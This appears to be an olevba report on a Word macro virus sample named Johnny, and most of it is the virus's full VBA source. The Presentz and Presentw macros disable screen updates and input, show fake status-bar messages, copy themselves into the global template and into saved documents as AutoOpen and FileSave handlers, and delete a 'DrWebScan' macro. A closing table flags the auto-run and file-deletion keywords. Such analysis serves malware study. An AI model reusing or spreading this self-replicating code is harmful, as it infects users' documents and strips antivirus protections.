olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Johnny-aaf0ae085bfb68e600e27cb367ca60710b2952ae
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Johnny-aaf0ae085bfb68e600e27cb367ca60710b2952ae - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO vGojohnny.bas 
in file: Virus.MSWord.Johnny-aaf0ae085bfb68e600e27cb367ca60710b2952ae - OLE stream: 'Macros/VBA/vGojohnny'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
'Our devise - A copy of "Go Johnny Go" on every computer !

'                                       M.H., E.R.
End Sub
-------------------------------------------------------------------------------
VBA MACRO Presentz.bas 
in file: Virus.MSWord.Johnny-aaf0ae085bfb68e600e27cb367ca60710b2952ae - OLE stream: 'Macros/VBA/Presentz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN() 'fs
Dim d$
Dim MH
Dim i
Dim A$
Dim lnh1
Dim dlg As Object
Dim iMC
Dim BI
On Error GoTo -1: On Error GoTo aend
WordBasic.ScreenUpdating (0)
WordBasic.DisableInput 1
d$ = WordBasic.[FileName$]()
MH = Len(d$)
For i = 0 To MH
A$ = WordBasic.[Right$](d$, i)
A$ = WordBasic.[Left$](WordBasic.[LTrim$](A$), 1)
If A$ = "\" Then GoTo cnt
Next i
cnt:
lnh1 = i - 1
If MH - lnh1 = 0 Then
On Error GoTo -1: On Error GoTo ecss
Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.PrintStatusBar "For Help, press F1"
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
MC
WordBasic.MacroCopy "Global:Presentz", WordBasic.[FileName$]() + ":FileSave"
WordBasic.FileSaveAs dlg
GoTo aend
Else
If WordBasic.[Right$](d$, 3) = "DOC" Then
MC
WordBasic.FileSaveAs Format:=1
Else
WordBasic.FileSave
End If
End If
ecss:
If Err.Number = 102 Then GoTo aend
aend:
On Error GoTo -1: On Error GoTo aen
iMC = WordBasic.CountMacros(0, 0)
For i = 1 To iMC
If WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then
BI = 1
End If
If WordBasic.[MacroName$](i, 0, 0) = "DrWebScan" Then
WordBasic.Organizer Delete:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="DrWebScan", Tab:=3
End If
If WordBasic.[MacroName$](i, 0, 0) = "FileOpen" Then
WordBasic.Organizer Delete:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="FileOpen", Tab:=3
End If
Next i
If BI = 0 Then
WordBasic.MacroCopy d$ + ":Presentw", "Global:FileSaveAs"
End If
aen:
End Sub
Private Sub MC()
Dim ds$
ds$ = WordBasic.[FileName$]()
WordBasic.MacroCopy "Global:Presentv", ds$ + ":AutoOpen"
WordBasic.MacroCopy "Global:Presentv", ds$ + ":Presentv"
WordBasic.MacroCopy "Global:Presentw", ds$ + ":Presentw"
WordBasic.MacroCopy "Global:Presentz", ds$ + ":Presentz"
WordBasic.MacroCopy "Global:vGojohnny", ds$ + ":vGojohnny"
End Sub
-------------------------------------------------------------------------------
VBA MACRO Presentw.bas 
in file: Virus.MSWord.Johnny-aaf0ae085bfb68e600e27cb367ca60710b2952ae - OLE stream: 'Macros/VBA/Presentw'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN() 'fsAs
Dim d$
Dim Dl
Dim i
Dim A$
Dim lnh1
Dim dlg As Object
Dim NO$
Dim O_D_P$
Dim TMP$
Dim stt$
Dim tm$
Dim tm2$
Dim FileN$
Dim NDPh$
On Error GoTo -1: On Error GoTo aend
WordBasic.ScreenUpdating (0)
WordBasic.DisableInput 1
d$ = WordBasic.[FileName$]()
Dl = Len(d$)
For i = 0 To Dl
A$ = WordBasic.[Right$](d$, i)
A$ = WordBasic.[Left$](WordBasic.[LTrim$](A$), 1)
If A$ = "\" Then GoTo cnt
Next i
cnt:
lnh1 = i - 1
If Dl - lnh1 = 0 Then
Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
MC
WordBasic.FileSaveAs dlg
GoTo aend
End If
NO$ = LCase(WordBasic.[Right$](d$, lnh1))
O_D_P$ = WordBasic.[DefaultDir$](14)
TMP$ = WordBasic.[DefaultDir$](13)
stt$ = TMP$ + "\doc2.doc"
tm$ = TMP$ + "\" + NO$
tm2$ = TMP$ + "\~wrf7mhr.tmp"
If WordBasic.[Files$](tm2$) = "" Then
WordBasic.FileNewDefault
WordBasic.Insert "NAIPESVOH REHM"
WordBasic.PrintStatusBar "Starting Autosave"
WordBasic.FileSaveAs Name:=TMP$ + "\doc2.doc", Format:=0
WordBasic.FileClose
WordBasic.Rename TMP$ + "\doc2.doc", tm2$
End If
WordBasic.CopyFile FileName:=tm2$, Directory:=tm$
WordBasic.FileOpen tm$
WordBasic.PrintStatusBar "For Help, press F1"
On Error GoTo -1: On Error GoTo ife
Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
dlg.Name = NO$
WordBasic.Dialog.FileSaveAs dlg
FileN$ = dlg.Name
NDPh$ = WordBasic.[DefaultDir$](14)
If Len(NDPh$) > 3 Then NDPh$ = NDPh$ + "\"
If dlg.Format > 1 Then
WordBasic.FileClose 2
WordBasic.Kill tm$
WordBasic.FileSaveAs Name:=stt$, Format:=1
WordBasic.FileClose 2
WordBasic.FileNew Template:=stt$
WordBasic.FileSaveAs dlg
GoTo aend
End If
ife:
If Err.Number = 102 Then
WordBasic.FileClose 2
WordBasic.Kill tm$
GoTo aend
End If
d?ltmp:
WordBasic.FileClose 2
WordBasic.Kill tm$
MC
WordBasic.FileSaveAs Name:=NDPh$ + FileN$, Format:=1
aend:
End Sub
Private Sub MC()
Dim ds$
ds$ = WordBasic.[FileName$]()
WordBasic.MacroCopy "Global:Presentv", ds$ + ":AutoOpen"
WordBasic.MacroCopy "Global:Presentv", ds$ + ":Presentv"
WordBasic.MacroCopy "Global:Presentw", ds$ + ":Presentw"
WordBasic.MacroCopy "Global:Presentz", ds$ + ":Presentz"
WordBasic.MacroCopy "Global:Presentz", ds$ + ":FileSave"
WordBasic.MacroCopy "Global:vGojohnny", ds$ + ":vGojohnny"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

